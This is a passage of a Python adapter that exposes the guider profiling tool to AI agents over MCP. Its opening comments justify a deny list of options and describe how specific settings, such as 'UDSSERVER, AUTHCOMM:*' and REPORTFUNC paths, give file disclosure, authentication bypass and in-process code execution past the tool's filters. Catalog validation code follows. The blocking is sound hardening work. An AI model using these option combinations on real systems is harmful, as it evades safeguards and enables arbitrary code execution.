    # round 91 [MEDIUM]: UtilMgr.getParseMapAttr()/parseMapFile()
    # (guider.py:6591-6629, shared by printand/logand in LogMgr and
    # bugrep/perfetto/andcmd in AndroidMgr for address<->symbol translation)
    # opens "-q MAPFILE:<path>" with plain open(path, "r") and parses every
    # line as a mapping entry with no size/type restriction — an arbitrary
    # readable file's line content surfaces (partially) in the translated
    # output whenever any of those commands run with this option set.
    "MAPFILE",
    # round 91 [MEDIUM]: ElfAnalyzer.getObject()'s debug-companion-file
    # resolution (guider.py:186627-186721, reached by readelf/funcrec -I/
    # elftree/addr2sym/sym2addr and other ELF-parsing commands) supports
    # three independent ways to redirect which file gets opened and merged
    # as the target's debug symbol table via _mergeTables() -> a fresh
    # ElfAnalyzer(...) parse of that path — the exact same "arbitrary file
    # parsed as ELF, partial content disclosure" primitive already blocked
    # for PRELOAD/PRELOADLIST in round 87. REPELF (186629-186633) takes a
    # "src:des" pair and swaps in "des" verbatim whenever "src" matches the
    # path currently being analyzed — its key name contains none of
    # "FILE"/"PATH"/"DIR", so (like DEVFILTER in round 87) it bypasses
    # _filter_opts()'s generic path heuristic entirely. DEBUGDIRPATH
    # (186646-186650) and BUILDIDDIR (186704-186718) each append an
    # attacker-chosen directory to the list searched for a ".debug"/
    # build-id companion file — both key names do contain "PATH"/"DIR" so
    # they already reach _is_accessible_path(), but (as already established
    # for DBCFILE in round 87) that check only requires the path to already
    # exist or live under "/tmp/", which is not sufficient here either.
    "REPELF", "DEBUGDIRPATH", "BUILDIDDIR",
    # round 92 [CRITICAL, worst finding in this series]: TaskAnalyzer.
    # runTaskTop() (guider.py:196319-196376, the shared implementation of
    # "top" and most other process-monitoring modes) unconditionally calls
    # NetworkMgr.execReceiverTask() (13657-13681), which is a total no-op
    # unless "-q UDSSERVER" or "-q TCPSERVER" is set — but when either is
    # set, it spawns SysMgr.runServerTask() (93585-93822) as a daemon
    # thread, which is the EXACT SAME socket accept-loop that backs the
    # already-blocked top-level "server"/"cli" commands. Once a client
    # connects, the only gate is "at least one of AUTHCOMM/AUTHCMDLINE/
    # AUTHUSER/AUTHGROUP/AUTHGROUPS is set" (93699-93708) — AUTHCOMM/
    # AUTHCMDLINE match the connecting client's own comm/cmdline via
    # UtilMgr.isValidStr(), which (per rounds 84/85) treats a bare "*" as
    # matching everything, so "-q UDSSERVER, AUTHCOMM:*" authorizes ANY
    # connecting client unconditionally. Once "authorized", the client's
    # raw command string is queued and handled by SysMgr.reqHandler()'s
    # _handleCmd() (80822-...), which forks and runs
    # SysMgr.parseAnalOption(optStr) on the client-supplied option string —
    # a completely separate parsing path that never touches
    # mcp/guider_adapter.py's _filter_opts()/BLOCKED_OPTS/BLOCKED_COMMANDS
    # at all. The internal mainCmd allowlist there (81009-81097) still
    # includes kill/tkill/run (SysMgr.createProcess() arbitrary local
    # command execution)/disablepkglist/enablepkglist/stoppkglist/
    # runpkglist (round 84's CRITICAL wildcard whole-device-package-
    # destruction primitive)/remove/setprop/setsettings/download/scrcap/
    # scrrec/bugrec/bugrep/cpuprof/memprof — i.e. nearly every dangerous
    # primitive this entire audit series has spent 91 rounds closing off at
    # the mcp/ layer, all reachable again through this one separate
    # in-process code path. Neither key name contains FILE/PATH/DIR (same
    # SOCK-class structural blind spot as round 91's UDSSOCK), and
    # execReceiverTask() is a complete no-op without one of these two keys
    # set, so blocking UDSSERVER/TCPSERVER alone closes this path entirely —
    # AUTHCOMM/AUTHCMDLINE/AUTHUSER/AUTHGROUP/AUTHGROUPS/AUTHKEY are left
    # unblocked since they're inert without a running listener and remain
    # needed for legitimate human-configured server/cli use.
    "UDSSERVER", "TCPSERVER",
    # round 93 [CRITICAL, most direct RCE primitive in this series]:
    # UtilMgr.callPyFunc(path, fname, *args) (guider.py:7043-7065) does
    # "exec(open(path).read())" (execfile(path) on Python 2) to execute an
    # arbitrary caller-supplied path's full content as Python source in the
    # current process, BEFORE it even attempts to look up "fname" in
    # locals() — so the exec always runs as long as the path exists and is
    # readable, regardless of whether the named function exists. No shell,
    # no subprocess, no listener, no second connecting client required —
    # a single -q option achieves in-process arbitrary code execution.
    # Three independent -q options reach this sink via the exact same
    # "path:func[:args]" colon-split parsing: REPORTFUNC
    # (TaskAnalyzer.printSystemUsage()'s "custom" report section,
    # guider.py:231178-231194 — printSystemUsage() is called from
    # printSystemStatGen(), which runTaskTop()'s main loop calls
    # unconditionally every interval once past the first tick, guider.py:
    # 196357 — i.e. reachable from "top" and virtually every other
    # process-monitoring command); STARTCONDFUNC and EXITCONDFUNC
    # (TaskAnalyzer.checkLifeCond(timing), guider.py:243844-243903, reached
    # via checkLifeCond("START")/checkLifeCond("EXIT") — the EXIT path is
    # driven by checkTermCond(), called every interval right after
    # printSystemStatGen() in the same runTaskTop() main loop, guider.py:
    # 196359, giving it the same broad reachability as REPORTFUNC).
    # callPyFunc()'s third call site (guider.py:94507) is inside
    # runServerMode()'s guider.conf-driven event-handler config, gated by
    # the already-BLOCKED_COMMANDS "server"/"cli", so not a new MCP path.
    "REPORTFUNC", "STARTCONDFUNC", "EXITCONDFUNC",
}


# Pre-built index: mcp_tool → list of command names (built once at import time)
_TOOL_COMMANDS: dict = {}
for _cmd, _meta in CATALOG.items():
    _TOOL_COMMANDS.setdefault(_meta["mcp_tool"], []).append(_cmd)

# Canonical list of MCP tool names exposed by mcp/guider-mcp.py. Every command
# in CATALOG maps to one of these via mcp_tool (see _TOOL_COMMANDS above);
# "guiderHelp" is the one tool with no CATALOG-driven command enum of its own,
# so it's appended explicitly. Kept here as the single source of truth so
# guider-mcp.py's _ALLOWED dict and the openapi JSON's guiderHelp.tool_name
# enum can both be validated/generated against it instead of hand-duplicating
# the same 10 names.
MCP_TOOL_NAMES = tuple(sorted(_TOOL_COMMANDS)) + ("guiderHelp",)


def get_tool_commands(mcp_tool: str) -> list:
    """Return all command names assigned to the given MCP tool (O(1) lookup)."""
    return _TOOL_COMMANDS.get(mcp_tool, [])


def get_all_tool_commands() -> dict:
    """Return a shallow copy of the full mcp_tool -> [commands] index."""
    return dict(_TOOL_COMMANDS)


def get_catalog_entry(command: str) -> dict | None:
    """Return metadata for a command, or None if unknown/blocked."""
    if command in BLOCKED_COMMANDS:
        return None
    return CATALOG.get(command)


def validate_catalog() -> list[str]:
    """
    Validate CATALOG entries for common integrity issues.

    Checks:
    - android_only=True commands placed in a tool without device_id support
    - streaming=True commands missing default_duration
    - semaphore=True commands missing requires_root

    Returns a list of issue strings (empty = all clear).
    """
    _TOOLS_WITH_DEVICE_ID = frozenset({"androidPerf", "bpfTrace", "runCommand"})
    issues: list[str] = []

    for cmd, meta in CATALOG.items():
        tool = meta.get("mcp_tool", "")

        # android_only commands must be in a tool that accepts device_id
        if meta.get("android_only") and tool not in _TOOLS_WITH_DEVICE_ID:
            issues.append(
                f"[android_only] '{cmd}' is android_only=True but mcp_tool='{tool}' "
                f"has no device_id parameter (expected one of {sorted(_TOOLS_WITH_DEVICE_ID)})"
            )

        # streaming commands should declare a default_duration
        if meta.get("streaming") and not meta.get("default_duration"):
            issues.append(
                f"[streaming] '{cmd}' has streaming=True but default_duration is empty"
            )

        # semaphore (tracefs) commands need root
        if meta.get("semaphore") and not meta.get("requires_root"):
            issues.append(
                f"[semaphore] '{cmd}' has semaphore=True but requires_root=False"
            )

    _overlap = set(CATALOG) & BLOCKED_COMMANDS
    if _overlap:
        issues.append(f"[blocked_overlap] commands in both CATALOG and BLOCKED_COMMANDS: {sorted(_overlap)}")

    return issues


def validate_openai_function_defs() -> list[str]:
    """
    Validate that openapi/function_definitions_openai.json's per-tool command
    enum arrays match get_tool_commands() for the same tool (i.e. that the
    hand-maintained OpenAI function-calling schema hasn't drifted from CATALOG).

    The JSON file is located relative to this file's own location
    (os.path.dirname(__file__)/../openapi/function_definitions_openai.json) so
    this works regardless of checkout location. If the file can't be found or
    parsed, validation is skipped with a note instead of raising.

    Returns a list of issue strings (empty = all clear).
    """
    import json as _json

    issues: list[str] = []

    _here = os.path.dirname(os.path.abspath(__file__))
    _json_path = os.path.normpath(
        os.path.join(_here, "..", "openapi", "function_definitions_openai.json")
    )

    if not os.path.isfile(_json_path):
        return [
            f"[openai_defs] SKIPPED: {_json_path} not found "
            f"(cannot validate against CATALOG)"
        ]

    try:
        with open(_json_path, "r") as _f:
            _defs = _json.load(_f)
    except (OSError, ValueError) as e:
        return [f"[openai_defs] SKIPPED: failed to load {_json_path}: {e}"]

    _tools_to_check = (
        "systemMonitor", "bpfTrace", "ftraceProfile", "networkTrace",
        "androidPerf", "memoryAnalyze", "visualize", "logAnalyze",
    )

    _by_name = {}
    for _entry in _defs if isinstance(_defs, list) else []:
        _fn = _entry.get("function", {}) if isinstance(_entry, dict) else {}
        _name = _fn.get("name")
        if _name:
            _by_name[_name] = _fn

    for _tool in _tools_to_check:
        _fn = _by_name.get(_tool)
        if _fn is None:
            issues.append(f"[openai_defs] '{_tool}' has no matching function definition in {_json_path}")
            continue

        _cmd_prop = _fn.get("parameters", {}).get("properties", {}).get("command", {})
        _enum = _cmd_prop.get("enum")
        if _enum is None:
            issues.append(f"[openai_defs] '{_tool}' function definition has no 'command.enum' field")
            continue

        _expected = set(get_tool_commands(_tool))
        _actual = set(_enum)

        _missing = _expected - _actual
        _extra = _actual - _expected
        if _missing:
            issues.append(
                f"[openai_defs] '{_tool}' enum is missing commands present in CATALOG: {sorted(_missing)}"
            )
        if _extra:
            issues.append(
                f"[openai_defs] '{_tool}' enum has stale/extra commands not in CATALOG: {sorted(_extra)}"
            )

    # guiderHelp's tool_name.enum should list exactly the 10 MCP tool names
    # (the other 8 command enums above are per-tool CATALOG command lists;
    # this one is the list of tool names itself, so it's checked against
    # MCP_TOOL_NAMES instead of get_tool_commands()).
    _help_fn = _by_name.get("guiderHelp")
    if _help_fn is None:
        issues.append(f"[openai_defs] 'guiderHelp' has no matching function definition in {_json_path}")
    else:
        _tool_name_prop = _help_fn.get("parameters", {}).get("properties", {}).get("tool_name", {})
        _tool_name_enum = _tool_name_prop.get("enum")
        if _tool_name_enum is None:
            issues.append(f"[openai_defs] 'guiderHelp' function definition has no 'tool_name.enum' field")
        else:
            _expected = set(MCP_TOOL_NAMES)
            _actual = set(_tool_name_enum)

            _missing = _expected - _actual
            _extra = _actual - _expected
            if _missing:
                issues.append(
                    f"[openai_defs] 'guiderHelp' tool_name.enum is missing MCP tool names: {sorted(_missing)}"
                )
            if _extra:
                issues.append(
                    f"[openai_defs] 'guiderHelp' tool_name.enum has stale/extra tool names not in MCP_TOOL_NAMES: {sorted(_extra)}"
                )

    return issues


if __name__ == "__main__":
    import sys as _sys

    issues = validate_catalog() + validate_openai_function_defs()
    if issues:
        print(f"CATALOG validation: {len(issues)} issue(s) found:")
        for issue in issues:
            print(f"  {issue}")
        _sys.exit(1)
    else:
        print(f"CATALOG validation: OK ({len(CATALOG)} commands, no issues)")
